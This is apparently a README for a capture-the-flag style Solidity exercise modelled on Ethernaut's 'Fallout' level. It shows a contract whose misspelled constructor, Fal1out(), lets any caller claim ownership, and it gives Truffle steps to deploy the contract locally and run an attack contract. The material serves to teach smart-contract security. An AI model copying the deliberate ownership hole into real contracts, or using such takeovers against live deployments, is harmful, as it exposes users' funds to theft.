# Solidity game - Fallout

_Inspired by OpenZeppelin's [Ethernaut](https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5), Fallout Level_

⚠️Do not try on mainnet!

## Task

There is a contract written by the following source code. Look carefully at the source code, find risks, and attack it.

1. Claim ownership of the contract.

_Hint:_

1. [solhint](https://github.com/protofire/solhint) may be helpful

## What will you learn?

Mistakes, or _**bugs**_, happen to every coder, no matter how skilled.
But there are some useful tools that make your coding easier and huge safe.
No matter you are working alone or with teammates together, linters will reduce your mistakes.

## Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Fallout {
  using SafeMath for uint256;
  mapping(address => uint256) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = payable(msg.sender);
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
    require(msg.sender == owner, "caller is not the owner");
    _;
  }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    payable(msg.sender).transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint256) {
    return allocations[allocator];
  }
}

```

## Configuration

### Install Truffle cli

_Skip if you have already installed._

```
npm install -g truffle
```

### Install Dependencies

```
yarn install
```

## Deploy on local Ganache and Attack!💥

Start with staring Truffle console.

```
truffle console
truffle(development)> migrate --reset
truffle(development)> const accounts = await web3.eth.getAccounts()
truffle(development)> const [owner, hacker] = accounts
truffle(development)> const targetInstance = await Fallout.deployed()
truffle(development)> const hackerInstance = await Hacker.deployed()
truffle(development)> await hackerInstance.attack(Fallout.address, {from: hacker)})
```

Then you should see like:

```
{
  tx: '0xee2ae07bf1379a9f196d1d16cdb9e21a898ed0c20eb45eb8b588e321d64a70e6',
  receipt: {
    transactionHash: '0xee2ae07bf1379a9f196d1d16cdb9e21a898ed0c20eb45eb8b588e321d64a70e6',
    transactionIndex: 0,
    blockHash: '0xede0df93bd74c8b44dbd284d5d5a1d1a2a55096fdfb6a00c5d0e1a9b61e52c02',
    blockNumber: 272,
    from: '0xabfbf3ab7467af1c88bfe1a20eb8012326b81661',
    to: '0x44f7de26ca91ebcc882dc1ca28e6e29e6abbea51',
    gasUsed: 90010,
    cumulativeGasUsed: 90010,
    contractAddress: null,
    logs: [],
    status: true,
    logsBloom: '0x04000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000200000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
    rawLogs: [ [Object] ]
  },
  logs: []
}
```

Check if the attack has been successful.

```
truffle(development)> const targetOwner = await targetInstance.owner()
truffle(development)> targetOwner === hackerInstance.address
true
```

## Test

### Run Tests

```
yarn test
```

## Play on public net

The `Fallout` contract has been deployed at `0x47731653fFd286D6f218a2b5b0aB509F54da5C54` in `ropsten` net.

ABI:

```json
[
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "Fal1out",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "allocate",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "allocator",
          "type": "address"
        }
      ],
      "name": "sendAllocation",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "collectAllocations",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "allocator",
          "type": "address"
        }
      ],
      "name": "allocatorBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
]
```
